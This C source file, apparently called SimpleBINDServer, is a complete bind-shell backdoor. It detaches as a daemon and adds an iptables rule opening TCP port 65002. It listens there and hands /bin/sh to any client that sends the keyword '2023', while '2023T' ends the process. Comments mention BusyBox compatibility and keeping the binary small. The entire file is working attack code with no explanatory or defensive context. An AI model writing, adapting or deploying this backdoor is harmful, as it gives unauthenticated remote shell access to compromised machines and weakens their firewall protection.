#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 65002
#define MODIFY_IPTABLES 1

#define KEYWORD_SHELL "2023"
#define KEYWORD_TERMINATE "2023T"
#define SHELL_PATH "/bin/sh"

#define VAL(str) #str
#define STR(str) VAL(str)

void server (void);

int main (void) {
    int pid;

    if ((pid = fork()) == 0) {
        server();
    }

    if (pid == -1) {
        puts("fork() == -1\n"); 
    }

    return 0;
}

void server (void) {
    /* Create a new process group */
    if (setsid() < 0) {
        puts("setsid() < 0\n");
        return;
    }

    /*
        Close all file descriptors. Otherwise SimpleBINDServer will
        not properly detach from the parent process.
    */
    for (int i = 0; i < 1024; i++) {
        close(i);
    }

    /* Prevent creation of zombie processes */
    signal(SIGCHLD, SIG_IGN);

    int srvfd, clifd, ppid, pid, ret, byteRead;
    char buffer[32];

    ppid = getpid();

    /* Modify iptables */
    #ifdef MODIFY_IPTABLES
    if ((pid = fork()) == 0) {
        execl("/sbin/iptables", "iptables", "-I", "INPUT", "1", "-p", "tcp", "-j", "ACCEPT", "--dport", STR(PORT), NULL);
        return;
    }
    #endif

    srvfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    // No handling here
    int value = 1;
    ret = setsockopt(srvfd, SOL_SOCKET, SO_REUSEADDR, &value, sizeof(value));

    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = htons(PORT);
    srv.sin_addr.s_addr = htonl(INADDR_ANY);

    ret = bind(srvfd, (struct sockaddr *) &srv, sizeof(srv));
    if (ret < 0) {
        // If no return, we might listen a random port afterwards
        return;
    }
    
    ret = listen(srvfd, 0);
    if (ret < 0) {
        return;
    }

    while (1) {
        clifd = accept(srvfd, NULL, NULL);

        if ((pid = fork()) == 0) {
            close(srvfd);

            if (clifd < 0) {
                return;
            }

            byteRead = recv(clifd, buffer, sizeof(buffer)-1, 0);

            if (byteRead < 0) {
                goto exit;
            }

            /* 
               We can terminate the process even when something 
               with SHELL_PATH or execl is wrong
            */
            if (strncmp(KEYWORD_TERMINATE, buffer, sizeof(KEYWORD_TERMINATE)-1) == 0) {
                if (ppid > 2) {
                    kill(ppid, SIGTERM);
                }
                goto exit;
            }
 
            if (strncmp(KEYWORD_SHELL, buffer, sizeof(KEYWORD_SHELL)-1) == 0) {
                dup2(clifd, STDIN_FILENO);
                dup2(clifd, STDOUT_FILENO);
                dup2(clifd, STDERR_FILENO);

                /*
                    The value of argv[0] must be set properly or
                    it may not work on BusyBox!
                */
                execl(SHELL_PATH, SHELL_PATH, NULL);
                goto exit;
            }

            /*
                Using GOTO to reduce the filesize
            */
            exit:
            close(clifd);
            return;
        }
        close(clifd);
    }
    return;
}
